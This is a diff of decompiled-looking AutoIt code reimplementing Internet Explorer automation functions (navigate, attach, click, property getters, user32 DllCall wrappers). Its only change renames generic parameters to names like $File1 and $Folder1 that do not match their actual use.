@@ -37,7 +37,7 @@ Func Fn007A($StartPage = "about:blank", $ArgOpt01 = 0, $ArgOpt02 = 1, $ArgOpt03 
 	Return SetError(@error, 0, $Local0003)
 EndFunc
 
-Func Fn007B(ByRef $ArgRef00, $Arg01, $ArgOpt02 = 1)
+Func Fn007B(ByRef $ArgRef00, $File1, $ArgOpt02 = 1)
 	If Not IsObj($ArgRef00) Then
 		LogError("Error", "_IENavigate", "$_IEStatus_InvalidDataType")
 		Return SetError($Var0262, 1, 0)
@@ -46,7 +46,7 @@ Func Fn007B(ByRef $ArgRef00, $Arg01, $ArgOpt02 = 1)
 		LogError("Error", "_IENavigate", "$_IEStatus_InvalidObjectType")
 		Return SetError($Var0263, 1, 0)
 	EndIf
-	$ArgRef00.navigate($Arg01)
+	$ArgRef00.navigate($File1)
 	If $ArgOpt02 Then
 		Fn007D($ArgRef00)
 		Return SetError(@error, 0, -1)
@@ -54,7 +54,7 @@ Func Fn007B(ByRef $ArgRef00, $Arg01, $ArgOpt02 = 1)
 	Return SetError($Var025F, 0, -1)
 EndFunc
 
-Func Fn007C($Arg00, $ArgOpt01 = "Title", $ArgOpt02 = 1)
+Func Fn007C($Folder1, $ArgOpt01 = "Title", $ArgOpt02 = 1)
 	$ArgOpt01 = StringLower($ArgOpt01)
 	$ArgOpt02 = Int($ArgOpt02)
 	If $ArgOpt02 < 1 Then
@@ -64,13 +64,13 @@ Func Fn007C($Arg00, $ArgOpt01 = "Title", $ArgOpt02 = 1)
 	If $ArgOpt01 = "embedded" Or $ArgOpt01 = "dialogbox" Then
 		Local $Local0004 = Opt("WinTitleMatchMode", 2)
 		If $ArgOpt01 = "dialogbox" And $ArgOpt02 > 1 Then
-			If IsHWnd($Arg00) Then
+			If IsHWnd($Folder1) Then
 				$ArgOpt02 = 1
 				LogError("Warning", "_IEAttach", "$_IEStatus_GeneralError", "$i_instance > 1 invalid with HWnd and DialogBox.  Setting to 1.")
 			Else
-				Local $Local0005 = WinList($Arg00, "")
+				Local $Local0005 = WinList($Folder1, "")
 				If $ArgOpt02 <= $Local0005[0][0] Then
-					$Arg00 = $Local0005[$ArgOpt02][1]
+					$Folder1 = $Local0005[$ArgOpt02][1]
 					$ArgOpt02 = 1
 				Else
 					LogError("Warning", "_IEAttach", "$_IEStatus_NoMatch")
@@ -79,7 +79,7 @@ Func Fn007C($Arg00, $ArgOpt01 = "Title", $ArgOpt02 = 1)
 				EndIf
 			EndIf
 		EndIf
-		Local $Local0006 = ControlGetHandle($Arg00, "", "[CLASS:Internet Explorer_Server; INSTANCE:" & $ArgOpt02 & "]")
+		Local $Local0006 = ControlGetHandle($Folder1, "", "[CLASS:Internet Explorer_Server; INSTANCE:" & $ArgOpt02 & "]")
 		Local $Local0001 = Fn0086($Local0006)
 		Opt("WinTitleMatchMode", $Local0004)
 		If IsObj($Local0001) Then
@@ -112,7 +112,7 @@ Func Fn007C($Arg00, $ArgOpt01 = "Title", $ArgOpt02 = 1)
 		If $Var0269 Then
 			Switch $ArgOpt01
 				Case "title"
-					If StringInStr($Var026B .document.title, $Arg00) > 0 Then
+					If StringInStr($Var026B .document.title, $Folder1) > 0 Then
 						If $ArgOpt02 = $Local0009 Then
 							Return SetError($Var025F, 0, $Var026B)
 						Else
@@ -129,10 +129,10 @@ Func Fn007C($Arg00, $ArgOpt01 = "Title", $ArgOpt02 = 1)
 					Local $Local000A = False
 					$Var026A = RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\", "Window Title")
 					If Not @error Then
-						If StringInStr($Var026B .document.title & " - " & $Var026A, $Arg00) Then $Local000A = True
+						If StringInStr($Var026B .document.title & " - " & $Var026A, $Folder1) Then $Local000A = True
 					Else
-						If StringInStr($Var026B .document.title & " - Microsoft Internet Explorer", $Arg00) Then $Local000A = True
-						If StringInStr($Var026B .document.title & " - Windows Internet Explorer", $Arg00) Then $Local000A = True
+						If StringInStr($Var026B .document.title & " - Microsoft Internet Explorer", $Folder1) Then $Local000A = True
+						If StringInStr($Var026B .document.title & " - Windows Internet Explorer", $Folder1) Then $Local000A = True
 					EndIf
 					If $Local000A Then
 						If $ArgOpt02 = $Local0009 Then
@@ -142,7 +142,7 @@ Func Fn007C($Arg00, $ArgOpt01 = "Title", $ArgOpt02 = 1)
 						EndIf
 					EndIf
 				Case "url"
-					If StringInStr($Var026B .LocationURL, $Arg00) > 0 Then
+					If StringInStr($Var026B .LocationURL, $Folder1) > 0 Then
 						If $ArgOpt02 = $Local0009 Then
 							Return SetError($Var025F, 0, $Var026B)
 						Else
@@ -150,7 +150,7 @@ Func Fn007C($Arg00, $ArgOpt01 = "Title", $ArgOpt02 = 1)
 						EndIf
 					EndIf
 				Case "text"
-					If StringInStr($Var026B .document.body.innerText, $Arg00) > 0 Then
+					If StringInStr($Var026B .document.body.innerText, $Folder1) > 0 Then
 						If $ArgOpt02 = $Local0009 Then
 							Return SetError($Var025F, 0, $Var026B)
 						Else
@@ -158,7 +158,7 @@ Func Fn007C($Arg00, $ArgOpt01 = "Title", $ArgOpt02 = 1)
 						EndIf
 					EndIf
 				Case "html"
-					If StringInStr($Var026B .document.body.innerHTML, $Arg00) > 0 Then
+					If StringInStr($Var026B .document.body.innerHTML, $Folder1) > 0 Then
 						If $ArgOpt02 = $Local0009 Then
 							Return SetError($Var025F, 0, $Var026B)
 						Else
@@ -170,7 +170,7 @@ Func Fn007C($Arg00, $ArgOpt01 = "Title", $ArgOpt02 = 1)
 						$ArgOpt02 = 1
 						LogError("Warning", "_IEAttach", "$_IEStatus_GeneralError", "$i_instance > 1 invalid with HWnd.  Setting to 1.")
 					EndIf
-					If Fn0082($Var026B, "hwnd") = $Arg00 Then
+					If Fn0082($Var026B, "hwnd") = $Folder1 Then
 						Return SetError($Var025F, 0, $Var026B)
 					EndIf
 				Case Else
@@ -345,7 +345,7 @@ Func Fn007F(ByRef $ArgRef00, $ArgOpt01 = -1)
 	EndSelect
 EndFunc
 
-Func Fn0080(ByRef $ArgRef00, $Arg01, $ArgOpt02 = "src", $ArgOpt03 = 0, $ArgOpt04 = 1)
+Func Fn0080(ByRef $ArgRef00, $File1, $ArgOpt02 = "src", $ArgOpt03 = 0, $ArgOpt04 = 1)
 	If Not IsObj($ArgRef00) Then
 		LogError("Error", "_IEImgClick", "$_IEStatus_InvalidDataType")
 		Return SetError($Var0262, 1, 0)
@@ -365,7 +365,7 @@ Func Fn0080(ByRef $ArgRef00, $Arg01, $ArgOpt02 = "src", $ArgOpt03 = 0, $ArgOpt04
 				LogError("Error", "_IEImgClick", "$_IEStatus_InvalidValue", "Invalid mode: " & $ArgOpt02)
 				Return SetError($Var0264, 3, 0)
 		EndSelect
-		If StringInStr($Var026E, $Arg01) Then
+		If StringInStr($Var026E, $File1) Then
 			If ($Var026F = $ArgOpt03) Then
 				$Var0271 .click
 				If $ArgOpt04 Then
@@ -381,129 +381,129 @@ Func Fn0080(ByRef $ArgRef00, $Arg01, $ArgOpt02 = "src", $ArgOpt03 = 0, $ArgOpt04
 	Return SetError($Var0266, 0, 0)
 EndFunc
 
-Func Fn0081(ByRef $ArgRef00, $Arg01)
+Func Fn0081(ByRef $ArgRef00, $File1)
 	If Not IsObj($ArgRef00) Then
 		LogError("Error", "_IEAction", "$_IEStatus_InvalidDataType")
 		Return SetError($Var0262, 1, 0)
 	EndIf
-	$Arg01 = StringLower($Arg01)
+	$File1 = StringLower($File1)
 	Select
-		Case $Arg01 = "click"
+		Case $File1 = "click"
 			If Fn0089($ArgRef00, "documentContainer") Then
 				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.Click()
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "disable"
+		Case $File1 = "disable"
 			If Fn0089($ArgRef00, "documentContainer") Then
 				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.disabled = True
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "enable"
+		Case $File1 = "enable"
 			If Fn0089($ArgRef00, "documentContainer") Then
 				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.disabled = False
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "focus"
+		Case $File1 = "focus"
 			If Fn0089($ArgRef00, "documentContainer") Then
 				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.Focus()
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "copy"
+		Case $File1 = "copy"
 			$ArgRef00.document.execCommand("Copy")
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "cut"
+		Case $File1 = "cut"
 			$ArgRef00.document.execCommand("Cut")
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "paste"
+		Case $File1 = "paste"
 			$ArgRef00.document.execCommand("Paste")
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "delete"
+		Case $File1 = "delete"
 			$ArgRef00.document.execCommand("Delete")
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "saveas"
+		Case $File1 = "saveas"
 			$ArgRef00.document.execCommand("SaveAs")
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "refresh"
+		Case $File1 = "refresh"
 			$ArgRef00.document.execCommand("Refresh")
 			Fn007D($ArgRef00)
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "selectall"
+		Case $File1 = "selectall"
 			$ArgRef00.document.execCommand("SelectAll")
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "unselect"
+		Case $File1 = "unselect"
 			$ArgRef00.document.execCommand("Unselect")
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "print"
+		Case $File1 = "print"
 			$ArgRef00.document.parentwindow.Print()
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "printdefault"
+		Case $File1 = "printdefault"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.execWB(6, 2)
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "back"
+		Case $File1 = "back"
 			If Not Fn0089($ArgRef00, "documentContainer") Then
 				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.GoBack()
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "blur"
+		Case $File1 = "blur"
 			$ArgRef00.Blur()
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "forward"
+		Case $File1 = "forward"
 			If Not Fn0089($ArgRef00, "documentContainer") Then
 				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.GoForward()
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "home"
+		Case $File1 = "home"
 			If Not Fn0089($ArgRef00, "documentContainer") Then
 				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.GoHome()
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "invisible"
+		Case $File1 = "invisible"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.visible = 0
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "visible"
+		Case $File1 = "visible"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.visible = 1
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "search"
+		Case $File1 = "search"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.GOsearch()
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "stop"
+		Case $File1 = "stop"
 			If Not Fn0089($ArgRef00, "documentContainer") Then
 				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.Stop()
 			Return SetError($Var025F, 0, 1)
-		Case $Arg01 = "quit"
+		Case $File1 = "quit"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
@@ -517,7 +517,7 @@ Func Fn0081(ByRef $ArgRef00, $Arg01)
 	EndSelect
 EndFunc
 
-Func Fn0082(ByRef $ArgRef00, $Arg01)
+Func Fn0082(ByRef $ArgRef00, $File1)
 	If Not IsObj($ArgRef00) Then
 		LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidDataType")
 		Return SetError($Var0262, 1, 0)
@@ -527,9 +527,9 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 		Return SetError($Var0263, 1, 0)
 	EndIf
 	Local $Local0013, $Var0272
-	$Arg01 = StringLower($Arg01)
+	$File1 = StringLower($File1)
 	Select
-		Case $Arg01 = "browserx"
+		Case $File1 = "browserx"
 			If Fn0089($ArgRef00, "browsercontainer") Or Fn0089($ArgRef00, "document") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
@@ -541,7 +541,7 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 				$Local0013 = $Local0013 .offsetParent
 			WEnd
 			Return SetError($Var025F, 0, $Var0272)
-		Case $Arg01 = "browsery"
+		Case $File1 = "browsery"
 			If Fn0089($ArgRef00, "browsercontainer") Or Fn0089($ArgRef00, "document") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
@@ -553,7 +553,7 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 				$Local0013 = $Local0013 .offsetParent
 			WEnd
 			Return SetError($Var025F, 0, $Var0272)
-		Case $Arg01 = "screenx"
+		Case $File1 = "screenx"
 			If Fn0089($ArgRef00, "window") Or Fn0089($ArgRef00, "document") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
@@ -569,7 +569,7 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 				WEnd
 			EndIf
 			Return SetError($Var025F, 0, $Var0272 + $ArgRef00.document.parentWindow.screenLeft)
-		Case $Arg01 = "screeny"
+		Case $File1 = "screeny"
 			If Fn0089($ArgRef00, "window") Or Fn0089($ArgRef00, "document") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
@@ -585,7 +585,7 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 				WEnd
 			EndIf
 			Return SetError($Var025F, 0, $Var0272 + $ArgRef00.document.parentWindow.screenTop)
-		Case $Arg01 = "height"
+		Case $File1 = "height"
 			If Fn0089($ArgRef00, "window") Or Fn0089($ArgRef00, "document") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
@@ -595,7 +595,7 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 			Else
 				Return SetError($Var025F, 0, $ArgRef00.offsetHeight)
 			EndIf
-		Case $Arg01 = "width"
+		Case $File1 = "width"
 			If Fn0089($ArgRef00, "window") Or Fn0089($ArgRef00, "document") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
@@ -605,45 +605,45 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 			Else
 				Return SetError($Var025F, 0, $ArgRef00.offsetWidth)
 			EndIf
-		Case $Arg01 = "isdisabled"
+		Case $File1 = "isdisabled"
 			Return SetError($Var025F, 0, $ArgRef00.isDisabled())
-		Case $Arg01 = "addressbar"
+		Case $File1 = "addressbar"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.AddressBar())
-		Case $Arg01 = "busy"
+		Case $File1 = "busy"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.Busy())
-		Case $Arg01 = "fullscreen"
+		Case $File1 = "fullscreen"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.fullScreen())
-		Case $Arg01 = "hwnd"
+		Case $File1 = "hwnd"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, HWnd($ArgRef00.HWnd()))
-		Case $Arg01 = "left"
+		Case $File1 = "left"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.Left())
-		Case $Arg01 = "locationname"
+		Case $File1 = "locationname"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.LocationName())
-		Case $Arg01 = "locationurl"
+		Case $File1 = "locationurl"
 			If Fn0089($ArgRef00, "browser") Then
 				Return SetError($Var025F, 0, $ArgRef00.locationURL())
 			EndIf
@@ -654,87 +654,87 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 				Return SetError($Var025F, 0, $ArgRef00.parentwindow.location.href())
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.document.parentwindow.location.href())
-		Case $Arg01 = "menubar"
+		Case $File1 = "menubar"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.MenuBar())
-		Case $Arg01 = "offline"
+		Case $File1 = "offline"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.OffLine())
-		Case $Arg01 = "readystate"
+		Case $File1 = "readystate"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.ReadyState())
-		Case $Arg01 = "resizable"
+		Case $File1 = "resizable"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.Resizable())
-		Case $Arg01 = "silent"
+		Case $File1 = "silent"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.Silent())
-		Case $Arg01 = "statusbar"
+		Case $File1 = "statusbar"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.StatusBar())
-		Case $Arg01 = "statustext"
+		Case $File1 = "statustext"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.StatusText())
-		Case $Arg01 = "top"
+		Case $File1 = "top"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.Top())
-		Case $Arg01 = "visible"
+		Case $File1 = "visible"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.Visible())
-		Case $Arg01 = "appcodename"
+		Case $File1 = "appcodename"
 			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.appCodeName())
-		Case $Arg01 = "appminorversion"
+		Case $File1 = "appminorversion"
 			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.appMinorVersion())
-		Case $Arg01 = "appname"
+		Case $File1 = "appname"
 			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.appName())
-		Case $Arg01 = "appversion"
+		Case $File1 = "appversion"
 			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.appVersion())
-		Case $Arg01 = "browserlanguage"
+		Case $File1 = "browserlanguage"
 			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.browserLanguage())
-		Case $Arg01 = "cookieenabled"
+		Case $File1 = "cookieenabled"
 			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.cookieEnabled())
-		Case $Arg01 = "cpuclass"
+		Case $File1 = "cpuclass"
 			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.cpuClass())
-		Case $Arg01 = "javaenabled"
+		Case $File1 = "javaenabled"
 			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.javaEnabled())
-		Case $Arg01 = "online"
+		Case $File1 = "online"
 			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.onLine())
-		Case $Arg01 = "platform"
+		Case $File1 = "platform"
 			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.platform())
-		Case $Arg01 = "systemlanguage"
+		Case $File1 = "systemlanguage"
 			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.systemLanguage())
-		Case $Arg01 = "useragent"
+		Case $File1 = "useragent"
 			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.userAgent())
-		Case $Arg01 = "userlanguage"
+		Case $File1 = "userlanguage"
 			Return SetError($Var025F, 0, $ArgRef00.document.parentWindow.top.navigator.userLanguage())
-		Case $Arg01 = "vcard"
+		Case $File1 = "vcard"
 			Local $Local000E[1][0x001D]
 			$Local000E[0][0] = "Business.City"
 			$Local000E[0][1] = "Business.Country"
@@ -769,58 +769,58 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 				$Local000E[1][$Var0273] = Execute('$o_object.document.parentWindow.top.navigator.userProfile.getAttribute("' & $Local000E[0][$Var0273] & '")')
 			Next
 			Return SetError($Var025F, 0, $Local000E)
-		Case $Arg01 = "referrer"
+		Case $File1 = "referrer"
 			Return SetError($Var025F, 0, $ArgRef00.document.referrer)
-		Case $Arg01 = "theatermode"
+		Case $File1 = "theatermode"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.TheaterMode)
-		Case $Arg01 = "toolbar"
+		Case $File1 = "toolbar"
 			If Not Fn0089($ArgRef00, "browser") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.ToolBar)
-		Case $Arg01 = "contenteditable"
+		Case $File1 = "contenteditable"
 			If Fn0089($ArgRef00, "browser") Or Fn0089($ArgRef00, "document") Then
 				$Local0013 = $ArgRef00.document.body
 			Else
 				$Local0013 = $ArgRef00
 			EndIf
 			Return SetError($Var025F, 0, $Local0013 .isContentEditable)
-		Case $Arg01 = "innertext"
+		Case $File1 = "innertext"
 			If Fn0089($ArgRef00, "documentcontainer") Or Fn0089($ArgRef00, "document") Then
 				$Local0013 = $ArgRef00.document.body
 			Else
 				$Local0013 = $ArgRef00
 			EndIf
 			Return SetError($Var025F, 0, $Local0013 .innerText)
-		Case $Arg01 = "outertext"
+		Case $File1 = "outertext"
 			If Fn0089($ArgRef00, "documentcontainer") Or Fn0089($ArgRef00, "document") Then
 				$Local0013 = $ArgRef00.document.body
 			Else
 				$Local0013 = $ArgRef00
 			EndIf
 			Return SetError($Var025F, 0, $Local0013 .outerText)
-		Case $Arg01 = "innerhtml"
+		Case $File1 = "innerhtml"
 			If Fn0089($ArgRef00, "documentcontainer") Or Fn0089($ArgRef00, "document") Then
 				$Local0013 = $ArgRef00.document.body
 			Else
 				$Local0013 = $ArgRef00
 			EndIf
 			Return SetError($Var025F, 0, $Local0013 .innerHTML)
-		Case $Arg01 = "outerhtml"
+		Case $File1 = "outerhtml"
 			If Fn0089($ArgRef00, "documentcontainer") Or Fn0089($ArgRef00, "document") Then
 				$Local0013 = $ArgRef00.document.body
 			Else
 				$Local0013 = $ArgRef00
 			EndIf
 			Return SetError($Var025F, 0, $Local0013 .outerHTML)
-		Case $Arg01 = "title"
+		Case $File1 = "title"
 			Return SetError($Var025F, 0, $ArgRef00.document.title)
-		Case $Arg01 = "uniqueid"
+		Case $File1 = "uniqueid"
 			If Fn0089($ArgRef00, "window") Then
 				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
@@ -863,8 +863,8 @@ Func Fn0084(ByRef $ArgRef00)
 	Return SetError($Var025F, 0, 1)
 EndFunc
 
-Func Fn0085($Arg00)
-	Local $Local000F = DllCall("user32.dll", "bool", "LockSetForegroundWindow", "uint", $Arg00)
+Func Fn0085($Folder1)
+	Local $Local000F = DllCall("user32.dll", "bool", "LockSetForegroundWindow", "uint", $Folder1)
 	If @error Or $Local000F[0] Then Return SetError(1, Fn0079(), 0)
 	Return $Local000F[0]
 EndFunc
@@ -898,15 +898,15 @@ Func Fn0086(ByRef $ArgRef00)
 	EndIf
 EndFunc
 
-Func Fn0087($Arg00)
-	Local $Local000F = DllCall("user32.dll", "uint", "RegisterWindowMessageW", "wstr", $Arg00)
+Func Fn0087($Folder1)
+	Local $Local000F = DllCall("user32.dll", "uint", "RegisterWindowMessageW", "wstr", $Folder1)
 	If @error Then Return SetError(@error, @extended, 0)
 	If $Local000F[0] = 0 Then Return SetError(10, Fn0079(), 0)
 	Return $Local000F[0]
 EndFunc
 
-Func Fn0088($Arg00, $Arg01, $Arg02, $Arg03, $Arg04, $Arg05, ByRef $ArgRef06, $ArgOpt07 = 0, $ArgOpt08 = "int", $ArgOpt09 = "int")
-	Local $Local000F = DllCall("user32.dll", "lresult", "SendMessageTimeout", "hwnd", $Arg00, "uint", $Arg01, $ArgOpt08, $Arg02, $ArgOpt09, $Arg03, "uint", $Arg04, "uint", $Arg05, "dword_ptr*", "")
+Func Fn0088($Folder1, $File1, $Folder2, $File2, $Arg04, $Arg05, ByRef $ArgRef06, $ArgOpt07 = 0, $ArgOpt08 = "int", $ArgOpt09 = "int")
+	Local $Local000F = DllCall("user32.dll", "lresult", "SendMessageTimeout", "hwnd", $Folder1, "uint", $File1, $ArgOpt08, $Folder2, $ArgOpt09, $File2, "uint", $Arg04, "uint", $Arg05, "dword_ptr*", "")
 	If @error Or $Local000F[0] = 0 Then
 		$ArgRef06 = 0
 		Return SetError(1, Fn0079(), 0)
@@ -916,7 +916,7 @@ Func Fn0088($Arg00, $Arg01, $Arg02, $Arg03, $Arg04, $Arg05, ByRef $ArgRef06, $Ar
 	Return $Local000F
 EndFunc
 
-Func Fn0089(ByRef $ArgRef00, $Arg01)
+Func Fn0089(ByRef $ArgRef00, $File1)
 	If Not IsObj($ArgRef00) Then
 		Return SetError($Var0262, 1, 0)
 	EndIf
@@ -925,7 +925,7 @@ Func Fn0089(ByRef $ArgRef00, $Arg01)
 	Local $Local000C = Fn0083()
 	Fn000A(False)
 	Local $Local0012 = String(ObjName($ArgRef00)), $Var0277 = False
-	Switch $Arg01
+	Switch $File1
 		Case "browserdom"
 			Local $Local0013 = $ArgRef00.document
 			If Fn0089($ArgRef00, "documentcontainer") Then
@@ -965,9 +965,9 @@ Func Fn0089(ByRef $ArgRef00, $Arg01)
 	EndIf
 EndFunc
 
-Func LogError($Arg00, $Arg01, $ArgOpt02 = "", $ArgOpt03 = "")
+Func LogError($Folder1, $File1, $ArgOpt02 = "", $ArgOpt03 = "")
 	If $Var0251 Or $Var024F Then
-		Local $Local0014 = "--> IE.au3 " & $version[5] & " " & $Arg00 & " from function " & $Arg01
+		Local $Local0014 = "--> IE.au3 " & $version[5] & " " & $Folder1 & " from function " & $File1
 		If Not String($ArgOpt02) = "" Then $Local0014 &= ", " & $ArgOpt02
